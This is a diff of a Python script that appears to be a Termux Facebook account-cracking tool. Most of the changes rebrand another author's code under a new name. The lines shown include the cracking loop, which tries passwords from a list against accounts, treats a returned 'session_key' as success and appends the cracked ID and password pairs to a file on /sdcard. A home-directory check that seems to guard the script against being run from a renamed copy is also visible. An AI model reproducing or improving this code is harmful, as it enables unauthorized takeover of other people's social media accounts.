@@ -49,8 +49,8 @@ def line():
 def p(x):
 	print(x)
  
-#SOURCE BY : UMAR-NAZEER
-#GITHUB : CYBER-ATTACK 
+#SOURCE BY : ANAYA-CHAUDHRY
+#GITHUB : ANAYA-CHAUDHRY 
 #★彡[ɪᴍʀᴀɴ ᴋʜᴀɴ ʟᴏᴠᴇʀ]彡★
 #coding = utf-8
 from uuid import uuid4
@@ -147,19 +147,15 @@ os.system("rm -rf .f2")
 logo = ("""\33[;33m   
          
 \033[92m
-  ______             __                           
- /      \           /  |                          
-/$$$$$$  | __    __ $$ |____    ______    ______  
-$$ |  $$/ /  |  /  |$$      \  /      \  /      \ 
-$$ |      $$ |  $$ |$$$$$$$  |/$$$$$$  |/$$$$$$  |
-$$ |   __ $$ |  $$ |$$ |  $$ |$$    $$ |$$ |  $$/ 
-$$ \__/  |$$ \__$$ |$$ |__$$ |$$$$$$$$/ $$ |      
-$$    $$/ $$    $$ |$$    $$/ $$       |$$ |      
- $$$$$$/   $$$$$$$ |$$$$$$$/   $$$$$$$/ $$/       
-          /  \__$$ |                              
-          $$    $$/                               
-           $$$$$$/                                
-
+ $$$$$$\  $$\   $$\  $$$$$$\ $$\     $$\  $$$$$$\        
+$$  __$$\ $$$\  $$ |$$  __$$\\$$\   $$  |$$  __$$\       
+$$ /  $$ |$$$$\ $$ |$$ /  $$ |\$$\ $$  / $$ /  $$ |      
+$$$$$$$$ |$$ $$\$$ |$$$$$$$$ | \$$$$  /  $$$$$$$$ |      
+$$  __$$ |$$ \$$$$ |$$  __$$ |  \$$  /   $$  __$$ |      
+$$ |  $$ |$$ |\$$$ |$$ |  $$ |   $$ |    $$ |  $$ |      
+$$ |  $$ |$$ | \$$ |$$ |  $$ |   $$ |    $$ |  $$ |      
+\__|  \__|\__|  \__|\__|  \__|   \__|    \__|  \__|      
+                                                                                                                                                                  
 \033[1;97m""")     
 
 #--(Dark@Colours)---#
@@ -248,7 +244,7 @@ def main():
         os.system('rm -rf ...txt')
         os.system('clear')
         print(logo);xchker()
-        print('The Original Codes are Written by Umar Nazeer')
+        print('The Original Codes are Written by ANAYA-CHAUDHRY')
         print(50*'-')
         print('[1] Fb Cloning Menu')
         print('[2] File Create Menu')
@@ -482,7 +478,7 @@ class crack_main():
         def m1(self,iid,name,passlist):
                 try:
                         global ok,loop,android_models
-                        sys.stdout.write('\r[UMAR] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
+                        sys.stdout.write('\r[ANAYA] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                         fn = name.split(' ')[0]
                         try:
                                 ln = name.split(' ')[1]
@@ -530,13 +526,13 @@ class crack_main():
                                 except:
                                         roid = iid
                                 if 'session_key' in po:
-                                        print(' \033[1;32m[UMAR-OK] '+roid+' | '+pas+'\033[0;97m')
-                                        open('/sdcard/umar_ok.txt','a').write(roid+'|'+pas+'\n')
+                                        print(' \033[1;32m[ANAYA-OK] '+roid+' | '+pas+'\033[0;97m')
+                                        open('/sdcard/ANAYA_ok.txt','a').write(roid+'|'+pas+'\n')
                                         ok.append(iid)
                                         break
                                 elif 'Please Confirm Email' in po:
-                                        print(' \033[1;32m[UMAR-OK] '+roid+' | '+pas+'\033[0;97m')
-                                        open('/sdcard/umar_ok.txt','a').write(roid+'|'+pas+'\n')
+                                        print(' \033[1;32m[ANAYA-OK] '+roid+' | '+pas+'\033[0;97m')
+                                        open('/sdcard/ANAYA_ok.txt','a').write(roid+'|'+pas+'\n')
                                         ok.append(iid)
                                         break
                                 else:
@@ -576,7 +572,7 @@ class crack_main():
                 print(50*'-')
                 print(' SucessFully Process Is Completed ')
                 print(' Total Ok Ids : '+str(len(ok)))
-                print(' Ok Ids Save In : /sdcard/UMAR_ok.txt')
+                print(' Ok Ids Save In : /sdcard/ANAYA_ok.txt')
                 print(50*'-')
                 input('\n Press enter to back ')
                 main()
@@ -828,7 +824,7 @@ except PermissionError:
 pat = os.getcwd()
 datar = []
 datar.append(pat)
-if '/data/data/com.termux/files/home/umar' in datar:
+if '/data/data/com.termux/files/home/anaya' in datar:
         pass
 else:
         for i in range(5000):
